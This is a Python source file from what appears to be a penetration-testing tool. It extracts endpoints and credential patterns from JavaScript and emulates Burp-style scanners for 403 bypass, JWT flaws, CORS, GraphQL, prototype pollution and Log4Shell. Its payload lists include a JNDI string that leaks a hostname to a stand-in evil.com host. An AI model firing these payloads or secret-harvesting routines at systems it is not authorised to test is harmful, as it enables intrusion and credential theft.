# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

# ============================================================
# 合并自: modules/js_deep_analyzer.py
# ============================================================

# modules/js_deep_analyzer.py
"""
JS 深度分析模块 - 完整增强版 v2.3
功能：
1. AST解析（使用 esprima，若可用）
2. 从 JS 提取 API、子域名、密钥、依赖
3. SourceMap还原（若可用）
4. 增强密钥提取（40+ 种模式，减少误报）
5. GraphQL内省检测
6. 框架检测（React/Vue/Angular）
7. 修复：递归深度限制，防止栈溢出
"""

import re
import json
import asyncio
import aiohttp
import base64
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

from vulnclaw.core.logger import logger

# 尝试导入 esprima
try:
    import esprima
    ESPRIMA_AVAILABLE = True
except ImportError:
    ESPRIMA_AVAILABLE = False
    logger.debug("⚠️ esprima 未安装，JS AST解析功能不可用")


class JSDeepAnalyzer:
    def __init__(self, js_content: str, base_url: str = "", source_url: str = ""):
        self.js_content = js_content
        self.base_url = base_url
        self.source_url = source_url
        self.ast = None
        self.findings = {
            "api_endpoints": [],
            "subdomains": [],
            "secrets": [],
            "routes": [],
            "strings": [],
            "source_map_url": None,
            "dependencies": [],
            "graphql_introspection": [],
            "frameworks": [],
        }

    # 静态资源黑名单
    STATIC_EXTENSIONS = {
        '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico',
        '.woff', '.woff2', '.ttf', '.eot', '.otf', '.webp', '.bmp',
        '.mp3', '.mp4', '.webm', '.ogg', '.wav', '.flac',
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.zip', '.tar', '.gz', '.rar', '.7z', '.bz2',
        '.exe', '.dmg', '.msi', '.deb', '.rpm',
        '.map', '.min.js', '.min.css'
    }

    API_PATTERNS = [
        '/api/', '/v1/', '/v2/', '/v3/', '/v4/', '/v5/',
        '/graphql', '/graphiql', '/playground',
        '/rest/', '/soap/', '/rpc/',
        '/auth/', '/login', '/signin', '/register',
        '/upload', '/download', '/export', '/import',
        '/admin/', '/manage/', '/dashboard/',
        '/payment/', '/order/', '/checkout/',
        '/user/', '/profile/', '/account/',
        '/search/', '/query/', '/filter/',
        '/config/', '/setting/', '/preference/',
        '/webhook/', '/callback/', '/event/',
        '/stream/', '/websocket', '/ws/',
        '/notification/', '/alert/', '/message/'
    ]

    # 修复：最大递归深度限制
    MAX_RECURSION_DEPTH = 100

    async def analyze(self) -> Dict:
        if not self.js_content:
            return self.findings
        logger.info(f"📜 分析 JS: {self.source_url or 'inline'} ({len(self.js_content)} 字符)")

        # 1. 检查 SourceMap
        await self._extract_source_map()

        # 2. 尝试 AST 解析（带递归深度保护）
        if ESPRIMA_AVAILABLE and len(self.js_content) < 500000:
            try:
                self.ast = esprima.parseScript(self.js_content, {"jsx": True})
                await self._analyze_ast()
            except RecursionError as e:
                logger.warning(f"⚠️ AST 递归深度超限，使用正则降级: {e}")
                self._analyze_regex()
            except Exception as e:
                logger.debug(f"AST解析失败: {e}，使用正则降级")
                self._analyze_regex()
        else:
            self._analyze_regex()

        # 3. 增强分析
        self._analyze_enhanced()

        # 4. 尝试从 SourceMap 中提取更多信息
        if self.findings["source_map_url"]:
            await self._fetch_source_map()

        # 过滤静态资源，只保留 API 路径
        self.findings["api_endpoints"] = self._filter_api_endpoints(self.findings["api_endpoints"])
        self.findings["routes"] = self._filter_api_endpoints(self.findings["routes"])

        # 去重和限制数量
        self.findings["api_endpoints"] = list(dict.fromkeys(self.findings["api_endpoints"]))[:200]
        self.findings["subdomains"] = list(dict.fromkeys(self.findings["subdomains"]))[:100]
        self.findings["routes"] = list(dict.fromkeys(self.findings["routes"]))[:100]
        self.findings["secrets"] = list({s["value"]: s for s in self.findings["secrets"]}.values())[:20]

        return self.findings

    def _filter_api_endpoints(self, endpoints: List[str]) -> List[str]:
        """过滤静态资源，只保留 API 特征路径"""
        filtered = []
        for ep in endpoints:
            if not isinstance(ep, str) or len(ep) < 3:
                continue

            ep_lower = ep.lower()

            # 1. 跳过静态资源扩展
            skip = False
            for ext in self.STATIC_EXTENSIONS:
                if ep_lower.endswith(ext):
                    skip = True
                    break
            if skip:
                continue

            # 2. 检查是否包含 API 特征
            is_api = False
            for pattern in self.API_PATTERNS:
                if pattern in ep_lower:
                    is_api = True
                    break

            # 3. 如果包含 '?' 参数，也可能是 API
            if '?' in ep and '=' in ep:
                is_api = True

            # 4. 如果路径长度合理且包含常见 API 关键词
            if not is_api:
                api_keywords = ['get', 'post', 'put', 'delete', 'patch', 'list', 'view', 'detail', 'create', 'update']
                if any(kw in ep_lower for kw in api_keywords):
                    is_api = True

            if is_api:
                filtered.append(ep)

        return filtered

    async def _extract_source_map(self):
        patterns = [
            r'//# sourceMappingURL=([^\s]+)',
            r'/*# sourceMappingURL=([^\s]+) */',
            r'//@ sourceMappingURL=([^\s]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, self.js_content)
            if match:
                source_map_url = match.group(1).strip()
                if source_map_url.startswith('/'):
                    source_map_url = urljoin(self.base_url, source_map_url)
                self.findings["source_map_url"] = source_map_url
                logger.info(f"   🗺️ 发现 SourceMap: {source_map_url}")
                break

    async def _fetch_source_map(self):
        if not self.findings["source_map_url"]:
            return
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.findings["source_map_url"], timeout=10, ssl=False) as resp:
                    if resp.status == 200:
                        data = await resp.text()
                        try:
                            sm = json.loads(data)
                            sources = sm.get('sources', [])
                            for src in sources:
                                if self._is_static_resource(src):
                                    continue
                                if '/api/' in src or '/routes/' in src:
                                    self.findings["api_endpoints"].extend(self._extract_api_from_path(src))
                                if src.endswith('.js'):
                                    self.findings["dependencies"].append(src)
                        except BaseException:
                            logger.debug("suppressed exception (core audit)")
        except Exception as e:
            logger.debug(f"SourceMap获取失败: {e}")

    def _is_static_resource(self, path: str) -> bool:
        path_lower = path.lower()
        for ext in self.STATIC_EXTENSIONS:
            if path_lower.endswith(ext):
                return True
        return False

    async def _analyze_ast(self):
        if not self.ast:
            return
        # 修复：使用迭代遍历替代递归，防止栈溢出
        for node in self._walk_ast_iterative(self.ast):
            if node.get('type') == 'Literal' and isinstance(node.get('value'), str):
                self._extract_from_string(node['value'])
            if node.get('type') == 'Property':
                key = node.get('key', {})
                if key.get('type') == 'Identifier':
                    key_name = key.get('name', '')
                    if key_name in ['path', 'route', 'url', 'uri'] and node.get('value', {}).get('type') == 'Literal':
                        path = node['value'].get('value', '')
                        if isinstance(path, str) and path.startswith('/'):
                            self.findings["routes"].append(path)
            if node.get('type') == 'TemplateLiteral':
                quasis = node.get('quasis', [])
                for quasi in quasis:
                    value = quasi.get('value', {}).get('raw', '')
                    self._extract_from_string(value)
            if node.get('type') == 'CallExpression':
                callee = node.get('callee', {})
                if callee.get('type') == 'Identifier':
                    name = callee.get('name', '')
                    if name in ['fetch', 'get', 'post', 'put', 'delete', 'patch']:
                        args = node.get('arguments', [])
                        if args and args[0].get('type') == 'Literal':
                            url_value = args[0].get('value', '')
                            if isinstance(url_value, str):
                                self.findings["api_endpoints"].append(url_value)
                if callee.get('type') == 'MemberExpression':
                    if callee.get('object', {}).get('name') == 'Route':
                        args = node.get('arguments', [])
                        for arg in args:
                            if arg.get('type') == 'ObjectExpression':
                                for prop in arg.get('properties', []):
                                    if prop.get('key', {}).get('name') == 'path':
                                        path_val = prop.get('value', {}).get('value')
                                        if path_val:
                                            self.findings["routes"].append(path_val)

    def _walk_ast_iterative(self, root):
        """迭代遍历 AST，避免递归栈溢出"""
        stack = [root]
        while stack:
            node = stack.pop()
            if isinstance(node, dict):
                yield node
                for key, value in node.items():
                    if isinstance(value, dict):
                        stack.append(value)
                    elif isinstance(value, list):
                        for item in value:
                            if isinstance(item, dict):
                                stack.append(item)
            elif isinstance(node, list):
                for item in node:
                    if isinstance(item, dict):
                        stack.append(item)

    def _analyze_regex(self):
        content = self.js_content
        string_pattern = r'["\']([^"\']+)["\']'
        strings = re.findall(string_pattern, content)
        for s in strings:
            self._extract_from_string(s)

        route_patterns = [
            r'path\s*:\s*["\']([^"\']+)["\']',
            r'<Route[^>]*path=["\']([^"\']+)["\']',
            r'<Redirect[^>]*to=["\']([^"\']+)["\']',
            r'router\.get\(["\']([^"\']+)["\']',
        ]
        for pattern in route_patterns:
            matches = re.findall(pattern, content, re.I)
            for m in matches:
                if not self._is_static_resource(m):
                    self.findings["routes"].append(m)

        api_patterns = [
            r'fetch\(["\']([^"\']+)["\']',
            r'axios\.(?:get|post|put|delete|patch)\(["\']([^"\']+)["\']',
            r'\.get\(["\']([^"\']+)["\']',
            r'\.post\(["\']([^"\']+)["\']',
            r'request\(["\']([^"\']+)["\']',
            r'http\.(?:get|post)\(["\']([^"\']+)["\']',
        ]
        for pattern in api_patterns:
            matches = re.findall(pattern, content, re.I)
            for m in matches:
                if isinstance(m, str) and not self._is_static_resource(m):
                    self.findings["api_endpoints"].append(m)

        self.findings["subdomains"] = self._extract_subdomains(content)
        self.findings["secrets"] = self._extract_secrets_enhanced(content)

    def _extract_from_string(self, value: str):
        if not isinstance(value, str) or len(value) < 3:
            return

        if self._is_static_resource(value):
            return

        if value.startswith('/') and len(value) > 2:
            is_api = False
            for pattern in self.API_PATTERNS:
                if pattern in value:
                    is_api = True
                    break
            if is_api:
                self.findings["api_endpoints"].append(value)
            elif len(value.split('/')) >= 3 and not any(ext in value for ext in ['.css', '.js', '.png', '.jpg']):
                self.findings["api_endpoints"].append(value)

        if value.startswith(('http://', 'https://')):
            parsed = urlparse(value)
            path = parsed.path
            if path and path != '/' and not self._is_static_resource(path):
                self.findings["api_endpoints"].append(path)
            domain = parsed.netloc
            if domain and '.' in domain:
                if self.base_url and self.base_url not in domain:
                    self.findings["subdomains"].append(domain)
        if '.' in value and len(value) < 100 and not value.startswith(('http', '/', 'data:')):
            if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', value):
                self.findings["subdomains"].append(value)

    def _analyze_enhanced(self):
        content = self.js_content

        # 框架检测
        frameworks = {
            "React": ['React', 'react', 'ReactDOM', 'useState', 'useEffect', 'createElement'],
            "Vue": ['Vue', 'vue', 'v-model', 'v-for', 'v-if', 'createApp'],
            "Angular": ['Angular', 'NgModule', 'Component', 'Injectable', 'angular'],
            "jQuery": ['jQuery', 'jquery', '$('],
            "Next.js": ['next', 'getServerSideProps', 'getStaticProps', 'NextRouter'],
            "Nuxt.js": ['nuxt', 'nuxt-link', 'nuxt-child'],
        }
        for name, indicators in frameworks.items():
            if any(ind in content for ind in indicators):
                self.findings["frameworks"].append(name)

        # GraphQL 内省检测
        graphql_patterns = [
            r'__schema\s*\{',
            r'__typename',
            r'query\s*\{\s*__schema',
            r'gql\s*`[^`]*__schema',
            r'apollo\s*:\s*gql\s*`[^`]*__schema',
        ]
        for pattern in graphql_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                self.findings["graphql_introspection"].append("GraphQL内省查询")

    def _extract_subdomains(self, content: str) -> List[str]:
        pattern = r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+(?:[a-zA-Z]{2,})'

        matches = []
        for segment in content.split():
            if len(segment) > 2000:
                continue
            found = re.findall(pattern, segment)
            matches.extend(found)

        common = ['google', 'facebook', 'twitter', 'github', 'cloudflare',
                  'amazonaws', 'azure', 'gstatic', 'googleapis', 'youtube',
                  'linkedin', 'instagram', 'whatsapp', 'wechat', 'tiktok',
                  'netflix', 'amazon', 'apple', 'microsoft', 'meta']

        result = []
        seen = set()
        for m in matches:
            if m in seen:
                continue
            seen.add(m)
            is_common = False
            for c in common:
                if c in m:
                    is_common = True
                    break
            if not is_common and len(m) > 5:
                result.append(m)

        return result[:200]

    def _extract_secrets_enhanced(self, content: str) -> List[Dict]:
        secrets = []

        # 先移除常见误报源
        content = re.sub(r'[a-f0-9]{32,64}(?=[;\s\}])', '[HASH]', content, flags=re.I)
        content = re.sub(r'xxxx[0-9a-f]+', '[PLACEHOLDER]', content, flags=re.I)
        content = re.sub(r'v\d+\.\d+\.\d+', '[VERSION]', content)

        patterns = [
            (r'AKIA[0-9A-Z]{16}', 'AWS_Access_Key'),
            (r'ASIA[0-9A-Z]{16}', 'AWS_Temporary_Key'),
            (r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', 'JWT'),
            (r'sk-[a-zA-Z0-9]{20,}', 'OpenAI_Key'),
            (r'sk-proj-[a-zA-Z0-9]{20,}', 'OpenAI_Project_Key'),
            (r'pk_[a-zA-Z0-9]{20,}', 'Stripe_Publishable'),
            (r'[sr]k_(live|test)_[0-9a-zA-Z]{24}', 'Stripe_Secret'),
            (r'AIza[0-9A-Za-z\\-_]{35}', 'Google_API_Key'),
            (r'gh[pousr]_[A-Za-z0-9]{36}', 'GitHub_Token'),
            (r'github_pat_[A-Za-z0-9_]{22,}', 'GitHub_PAT'),
            (r'xox[baprs]-[0-9A-Za-z-]{10,}', 'Slack_Token'),
            (r'hooks\.slack\.com/services/T[A-Za-z0-9_]{8,}/B[A-Za-z0-9_]{8,}/[A-Za-z0-9_]{24}', 'Slack_Webhook'),
            (r'-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----', 'Private_Key'),
            (r'-----BEGIN CERTIFICATE-----', 'Certificate'),
            (r'api[_-]?key\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', 'API_Key'),
            (r'secret\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', 'Secret'),
            (r'token\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', 'Token'),
            (r'password\s*[:=]\s*["\']([a-zA-Z0-9_\-]{8,})["\']', 'Password'),
            (r'(mysql|postgresql|mongodb|redis|sqlite)://[^"\'\s<>]+', 'Database_URI'),
            (r'(?:DATABASE_URL|REDIS_URL|MONGODB_URI|JWT_SECRET|APP_KEY)\s*[:=]\s*["\']([^"\']+)["\']', 'Env_Variable'),
            (r'FirebaseConfig\s*[:=]\s*{[^}]*apiKey[^}]*}', 'Firebase_Config'),
            (r'sentry\s*[:=]\s*["\']([^"\']+)["\']', 'Sentry_DSN'),
            (r'cognito\.(?:UserPoolId|ClientId)\s*=\s*["\']([^"\']+)["\']', 'Cognito_Config'),
        ]

        for pattern, label in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                for m in set(matches):
                    if isinstance(m, tuple):
                        m = m[0] if m else ""
                    if m and len(m) > 5 and len(m) < 200:
                        if m in ['xxxx', 'test', 'demo', 'example', 'your-api-key', 'YOUR_KEY']:
                            continue
                        if m.isdigit() or m.isalpha() and len(m) < 10:
                            continue
                        secrets.append({"type": label, "value": m[:80]})

        return secrets

    def _extract_api_from_path(self, path: str) -> List[str]:
        result = []
        if self._is_static_resource(path):
            return result
        api_matches = re.findall(r'(/api/[a-zA-Z0-9\-_/?&=]+)', path)
        result.extend(api_matches)
        v_matches = re.findall(r'(/v[0-9]+/[a-zA-Z0-9\-_/?&=]+)', path)
        result.extend(v_matches)
        return result


async def analyze_js_deep(js_content: str, base_url: str = "", source_url: str = "") -> Dict:
    """
    对外包装：超时 + 任意异常兜底，保证调用方永远不会因单个 JS 分析失败抛异常中断。
    """
    DEFAULT_RESULT: Dict = {
        "api_endpoints": [],
        "subdomains": [],
        "secrets": [],
        "routes": [],
        "strings": [],
        "source_map_url": None,
        "dependencies": [],
        "graphql_introspection": [],
        "frameworks": [],
    }
    if not js_content or not isinstance(js_content, str):
        return DEFAULT_RESULT

    try:
        analyzer = JSDeepAnalyzer(js_content, base_url, source_url)
        return await asyncio.wait_for(analyzer.analyze(), timeout=30)
    except asyncio.TimeoutError:
        logger.warning(
            f"📜 [JS] analyze_js_deep 超时(>30s) 兜底返回空: source={source_url[:120]} len={len(js_content)}"
        )
        return DEFAULT_RESULT
    except RecursionError as e:
        logger.warning(
            f"📜 [JS] analyze_js_deep 递归异常兜底返回空: source={source_url[:120]} err={e}"
        )
        return DEFAULT_RESULT
    except MemoryError as e:
        logger.warning(
            f"📜 [JS] analyze_js_deep 内存异常兜底返回空: source={source_url[:120]} err={e}"
        )
        return DEFAULT_RESULT
    except Exception as e:
        logger.warning(
            f"📜 [JS] analyze_js_deep 异常兜底返回空: source={source_url[:120]} err={type(e).__name__}:{e}"
        )
        return DEFAULT_RESULT


deep_analyze_js = analyze_js_deep

__all__ = ['JSDeepAnalyzer', 'analyze_js_deep', 'deep_analyze_js']

# ============================================================
# 合并自: modules/burp_plugin_emulator.py
# ============================================================

# modules/burp_plugin_emulator.py
"""
Burp 插件能力模拟器 v2.1
修复：正则回溯风险优化，限制输入长度
"""

import re
import json
import base64
import time
import asyncio
import urllib.parse
from typing import Any
from urllib.parse import urljoin, urlparse

from vulnclaw.core.logger import logger
from vulnclaw.core.utils import async_get, async_post


# ============================================================
# 辅助函数：安全的Base64解码
# ============================================================
def _safe_b64_decode(data: str) -> bytes:
    data = data.replace('-', '+').replace('_', '/')
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.b64decode(data)


# ============================================================
# 1. JS Miner 风格
# ============================================================
def extract_from_javascript(js_content: str, url: str = "") -> Dict:
    result = {
        "subdomains": [],
        "api_endpoints": [],
        "secrets": [],
        "dependencies": [],
        "paths": [],
        "parameters": []
    }

    if not js_content:
        return result

    # 修复：限制输入长度，防止正则回溯攻击
    if len(js_content) > 100000:
        logger.debug(f"JS 内容过大 ({len(js_content)} 字符)，截断至 100000")
        js_content = js_content[:100000]

    # 优化后的子域名正则
    subdomain_pattern = r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+(?:[a-zA-Z]{2,})'
    found_subs = list(set(re.findall(subdomain_pattern, js_content)))
    common_domains = ['google', 'facebook', 'twitter', 'github', 'cloudflare',
                      'amazonaws', 'azure', 'gstatic', 'googleapis']
    result["subdomains"] = [s for s in found_subs if not any(c in s for c in common_domains)]

    api_patterns = [
        (r'["\'](/api/[^"\']+)["\']', 'relative'),
        (r'["\'](/v[0-9]+/[^"\']+)["\']', 'relative'),
        (r'\.(?:get|post|put|delete|patch)\(["\']([^"\']+)["\']', 'relative'),
        (r'fetch\(["\']([^"\']+)["\']', 'fetch'),
        (r'axios\.(?:get|post|put|delete|patch)\(["\']([^"\']+)["\']', 'axios'),
    ]
    endpoints = []
    for pattern, source in api_patterns:
        matches = re.findall(pattern, js_content)
        for m in matches:
            if m.startswith('/') and len(m) > 2:
                endpoints.append({"path": m, "source": source})

    seen = set()
    unique_endpoints = []
    for ep in endpoints:
        if ep["path"] not in seen:
            seen.add(ep["path"])
            unique_endpoints.append(ep)
    result["api_endpoints"] = unique_endpoints[:50]

    secret_patterns = [
        (r'AKIA[0-9A-Z]{16}', 'AWS_Access_Key'),
        (r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', 'JWT'),
        (r'sk-[a-zA-Z0-9]{20,}', 'OpenAI_Key'),
        (r'pk_[a-zA-Z0-9]{20,}', 'Stripe_Key'),
        (r'-----BEGIN (?:RSA|DSA|EC) PRIVATE KEY-----', 'Private_Key'),
        (r'[a-fA-F0-9]{32,}', 'Possible_Hash_or_Secret'),
    ]
    for pattern, label in secret_patterns:
        matches = re.findall(pattern, js_content)
        if matches:
            result["secrets"].append({
                "type": label,
                "value": matches[0][:80] + ("..." if len(matches[0]) > 80 else "")
            })

    lib_patterns = [
        (r'jquery[.-]([\d.]+)\.min\.js', 'jquery'),
        (r'angular(?:\.min)?\.js', 'angular'),
        (r'react(?:\.min)?\.js', 'react'),
        (r'vue(?:\.min)?\.js', 'vue'),
        (r'lodash\.min\.js', 'lodash'),
        (r'axios(?:\.min)?\.js', 'axios'),
        (r'vue\.([\d.]+)\.js', 'vue'),
        (r'react\.([\d.]+)\.js', 'react'),
    ]
    for pattern, lib_name in lib_patterns:
        if re.search(pattern, js_content, re.I):
            version_match = re.search(r'([\d.]+)', js_content)
            version = version_match.group(1) if version_match else "unknown"
            result["dependencies"].append({"name": lib_name, "version": version})

    path_pattern = r'["\'](/(?:[a-zA-Z0-9\-_]+/)*[a-zA-Z0-9\-_]+(?:\.[a-zA-Z]+)?)["\']'
    paths = re.findall(path_pattern, js_content)
    result["paths"] = list(set([p for p in paths if len(p) > 2]))[:30]

    return result


# ============================================================
# 2. Parameter Miner 风格
# ============================================================
COMMON_HIDDEN_PARAMS = [
    'id', 'user', 'uid', 'page', 'file', 'url', 'path', 'redirect',
    'token', 'key', 'search', 'query', 'name', 'email', 'pass', 'password',
    'q', 's', 'cat', 'dir', 'view', 'action', 'do', 'cmd', 'exec', 'command',
    'ip', 'host', 'domain', 'debug', 'test', 'config', 'admin', 'root',
    'api', 'v1', 'v2', 'version', 'token', 'auth', 'signature', 'timestamp',
    'nonce', 'state', 'scope', 'client_id', 'client_secret', 'grant_type',
    'redirect_uri', 'code', 'access_token', 'refresh_token', 'expires_in',
    'username', 'login', 'register', 'signup', 'profile', 'settings',
    'upload', 'download', 'export', 'import', 'backup', 'restore'
]


async def discover_hidden_params(
    url: str,
    session: aiohttp.ClientSession,
    limit: int = 30,
    method: str = "GET"
) -> List[str]:
    found = []
    base_url = url.rstrip('/')

    existing_params = []
    if '?' in url:
        for param in url.split('?')[1].split('&'):
            if '=' in param:
                existing_params.append(param.split('=')[0])

    to_test = [p for p in COMMON_HIDDEN_PARAMS if p not in existing_params][:limit]

    for param in to_test:
        try:
            if method.upper() == "GET":
                test_url = f"{base_url}?{param}=test"
                resp = await async_get(test_url, session=session, timeout=3)
                status = resp[0]
                text = resp[1]
            else:
                test_url = base_url
                resp = await async_post(test_url, data={param: "test"}, session=session, timeout=3)
                status = resp[0]
                text = resp[1]

            if status != 404 and len(text) > 50:
                found.append(param)
                logger.debug(f"   [+] 发现参数: {param}")
        except BaseException:
            logger.debug("suppressed exception (core audit)")

    logger.info(f"🔍 发现 {len(found)} 个隐藏参数: {found[:10]}")
    return found


# ============================================================
# 3. 403 Bypasser 风格
# ============================================================
BYPASS_TECHNIQUES = [
    {"path_suffix": "/%2e/"},
    {"path_suffix": "/%2e%2e/"},
    {"path_suffix": "/./"},
    {"path_suffix": "/..;/"},
    {"path_suffix": "/?test=1"},
    {"path_suffix": "/%20"},
    {"path_suffix": "/%09"},
    {"path_suffix": "/%23"},
    {"header": {"X-Original-URL": "/admin"}},
    {"header": {"X-Forwarded-For": "127.0.0.1"}},
    {"header": {"X-Host": "localhost"}},
    {"header": {"X-Remote-IP": "127.0.0.1"}},
    {"header": {"X-Client-IP": "127.0.0.1"}},
    {"header": {"X-Real-IP": "127.0.0.1"}},
    {"header": {"X-Originating-IP": "127.0.0.1"}},
    {"header": {"X-Forwarded-Host": "127.0.0.1"}},
    {"header": {"X-Forwarded-Scheme": "http"}},
    {"header": {"X-Rewrite-URL": "/admin"}},
]


async def scan_403_bypass(
    url: str,
    session: aiohttp.ClientSession,
    test_path: str = "/admin"
) -> List[Dict]:
    results = []
    base_url = url.rstrip('/')

    try:
        original = await async_get(base_url + test_path, session=session, timeout=5)
        original_status = original[0]
    except BaseException:
        original_status = 403

    if original_status != 403:
        return [{"note": "Target not 403, no bypass needed"}]

    for technique in BYPASS_TECHNIQUES:
        try:
            if "path_suffix" in technique:
                test_url = base_url + test_path + technique["path_suffix"]
                headers = {}
            else:
                test_url = base_url + test_path
                headers = technique["header"]

            resp = await async_get(test_url, session=session, timeout=5, headers=headers)
            status = resp[0]
            text = resp[1]

            if status != 403 and status != 404:
                results.append({
                    "url": test_url,
                    "original_status": original_status,
                    "new_status": status,
                    "technique": str(technique),
                    "length": len(text),
                    "success": True
                })
                logger.warning(f"🚨 403 Bypass 成功: {test_url} -> {status}")
        except BaseException:
            logger.debug("suppressed exception (core audit)")

    return results


# ============================================================
# 4. JWT Scanner 风格
# ============================================================
def scan_jwt_vulnerabilities(token: str) -> List[Dict]:
    vulnerabilities = []

    if not token:
        return []

    parts = token.split('.')

    if len(parts) != 3:
        return [{"type": "Invalid JWT", "severity": "Info", "detail": "Not a valid JWT format"}]

    try:
        header_json = _safe_b64_decode(parts[0]).decode('utf-8', errors='ignore')
        payload_json = _safe_b64_decode(parts[1]).decode('utf-8', errors='ignore')

        header = json.loads(header_json)
        payload = json.loads(payload_json)

        if header.get('alg') == 'none':
            vulnerabilities.append({
                "type": "alg: none",
                "severity": "Critical",
                "detail": "JWT uses 'none' algorithm, easily forged"
            })

        if payload.get('exp'):
            if payload['exp'] < time.time():
                vulnerabilities.append({
                    "type": "Expired Token",
                    "severity": "Medium",
                    "detail": f"JWT expired at {time.ctime(payload['exp'])}"
                })

        sensitive_keys = ['password', 'secret', 'key', 'token', 'admin', 'user', 'email', 'phone']
        for key in sensitive_keys:
            if key in payload and payload[key]:
                vulnerabilities.append({
                    "type": "Sensitive Data in JWT",
                    "severity": "High",
                    "detail": f"Found '{key}': {str(payload[key])[:50]}"
                })

        weak_algs = ['HS256', 'HS384', 'HS512']
        if header.get('alg') in weak_algs and len(payload.get('sub', '')) > 0:
            vulnerabilities.append({
                "type": "Weak Signing Algorithm",
                "severity": "Medium",
                "detail": f"Uses {header.get('alg')}, vulnerable to brute force if secret is weak"
            })

        if payload.get('admin') == True:
            vulnerabilities.append({
                "type": "Admin Privilege in JWT",
                "severity": "High",
                "detail": "JWT payload contains 'admin': true"
            })

    except json.JSONDecodeError as e:
        vulnerabilities.append({
            "type": "JWT Parse Error",
            "severity": "Info",
            "detail": f"JSON decode error: {e}"
        })
    except Exception as e:
        vulnerabilities.append({
            "type": "JWT Parse Error",
            "severity": "Info",
            "detail": str(e)
        })

    return vulnerabilities


# ============================================================
# 5. Server-Side Prototype Pollution 风格
# ============================================================
PROTOTYPE_PAYLOADS = [
    {"__proto__": {"polluted": "true"}},
    {"constructor": {"prototype": {"polluted": "true"}}},
    {"__proto__[polluted]": "true"},
    {"constructor[prototype][polluted]": "true"},
    {"__proto__.polluted": "true"},
    {"constructor.prototype.polluted": "true"},
]


async def scan_prototype_pollution(
    url: str,
    session: aiohttp.ClientSession,
    param_name: Optional[str] = None
) -> List[Dict]:
    results = []
    base_url = url.rstrip('/')

    for payload in PROTOTYPE_PAYLOADS:
        try:
            if param_name:
                encoded_payload = urllib.parse.quote(json.dumps(payload))
                test_url = f"{base_url}?{param_name}={encoded_payload}"
                resp = await async_get(test_url, session=session, timeout=5)
            else:
                test_url = base_url
                resp = await async_post(test_url, json=payload, session=session, timeout=5)

            text = resp[1]
            status = resp[0]

            if "polluted" in text.lower() or "true" in text.lower():
                results.append({
                    "type": "Prototype Pollution",
                    "severity": "High",
                    "payload": payload,
                    "status": status,
                    "evidence": "Response contains pollution indicator"
                })
                break
        except BaseException:
            logger.debug("suppressed exception (core audit)")

    return results


# ============================================================
# 6. CORS Misconfiguration 风格
# ============================================================
async def scan_cors_misconfig(url: str, session: aiohttp.ClientSession) -> List[Dict]:
    results = []
    evil_origin = "https://evil-test-123456.com"

    try:
        resp = await async_get(url, session=session, timeout=5, headers={"Origin": evil_origin})
        headers = resp[2] if len(resp) > 2 else {}

        acao = headers.get("Access-Control-Allow-Origin", "")
        acac = headers.get("Access-Control-Allow-Credentials", "")

        if acao == "*":
            results.append({
                "type": "CORS Wildcard",
                "severity": "Medium",
                "detail": "Access-Control-Allow-Origin: * allows any domain",
                "evidence": f"ACAO: {acao}, ACAC: {acac}"
            })
        elif acao == evil_origin:
            severity = "High" if acac == "true" else "Medium"
            results.append({
                "type": "CORS Reflection",
                "severity": severity,
                "detail": f"Access-Control-Allow-Origin reflects attacker origin: {evil_origin}",
                "evidence": f"ACAO: {acao}, ACAC: {acac}"
            })
    except BaseException:
        logger.debug("suppressed exception (core audit)")

    return results


# ============================================================
# 7. GraphQL 探测器风格
# ============================================================
GRAPHQL_PATHS = [
    "/graphql", "/graphiql", "/playground", "/gql", "/api/graphql",
    "/v1/graphql", "/v2/graphql", "/query", "/api/query"
]


async def discover_graphql_endpoint(
    base_url: str,
    session: aiohttp.ClientSession
) -> List[str]:
    found = []
    base = base_url.rstrip('/')

    for path in GRAPHQL_PATHS:
        test_url = base + path
        try:
            resp = await async_get(test_url, session=session, timeout=3)
            if resp[0] in (200, 400, 405):
                text = resp[1].lower()
                if "graphql" in text or "query" in text or "mutation" in text:
                    found.append(test_url)
                    logger.info(f"   🎯 发现 GraphQL 端点: {test_url}")
        except BaseException:
            logger.debug("suppressed exception (core audit)")

    return found


# ============================================================
# 8. Log4Shell 检测风格
# ============================================================
LOG4J_PAYLOADS = [
    "${jndi:ldap://127.0.0.1:1389/evil}",
    "${jndi:rmi://127.0.0.1:1099/evil}",
    "${jndi:dns://127.0.0.1}",
    "${jndi:ldap://${env:hostname}.evil.com/evil}",
    "${jndi:${lower:l}${upper:d}ap://evil.com/evil}"
]


async def scan_log4j(
    url: str,
    param: str,
    session: aiohttp.ClientSession
) -> List[Dict]:
    results = []

    for payload in LOG4J_PAYLOADS[:3]:
        try:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"
            resp = await async_get(test_url, session=session, timeout=3)
            text = resp[1]
            status = resp[0]

            jndi_indicators = ['javax.naming', 'jndi', 'ldap', 'rmi', 'dns']
            if any(ind in text.lower() for ind in jndi_indicators):
                results.append({
                    "type": "Log4Shell",
                    "severity": "Critical",
                    "payload": payload,
                    "status": status,
                    "evidence": "Response contains JNDI error indicators"
                })
                break
        except BaseException:
            logger.debug("suppressed exception (core audit)")

    return results


# ============================================================
